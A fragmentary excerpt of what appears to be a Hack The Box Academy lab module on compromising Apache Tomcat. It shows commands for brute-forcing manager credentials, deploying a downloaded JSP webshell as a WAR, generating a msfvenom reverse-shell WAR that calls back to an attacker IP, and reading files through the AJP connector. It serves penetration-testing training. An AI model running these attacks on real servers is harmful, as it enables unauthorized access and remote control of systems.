...
![HTTP 401 Unauthorized requests to /manager/html on Apache Tomcat, showing request and response details with authorization header.](https://academy.hackthebox.com/storage/modules/113/burp_tomcat.png)
...
```shell-session
xF1NN@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d
...
```shell-session
xF1NN@htb[/htb]$ python3 mgr_brute.py  -h
...
```shell-session
xF1NN@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
...
![Tomcat Web Application Manager interface showing applications list with paths, status, and deployment options.](https://academy.hackthebox.com/storage/modules/113/tomcat_mgr.png)
...
```shell-session
xF1NN@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
xF1NN@htb[/htb]$ zip -r backup.war cmd.jsp 
...
![Tomcat deploy interface with fields for context path, version, XML config, and WAR file upload, showing 'backup.war' selected.](https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png)
...
```shell-session
xF1NN@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
...
```shell-session
xF1NN@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
...
![VirusTotal report showing 2 out of 58 security vendors flagging 'cmd.jsp' as malicious with 'Backdoor.ASP.WEBSHELL.UWMANL' detection.](https://academy.hackthebox.com/storage/modules/113/vt2.png)
...
```shell-session
xF1NN@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local
...
```shell-session
xF1NN@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
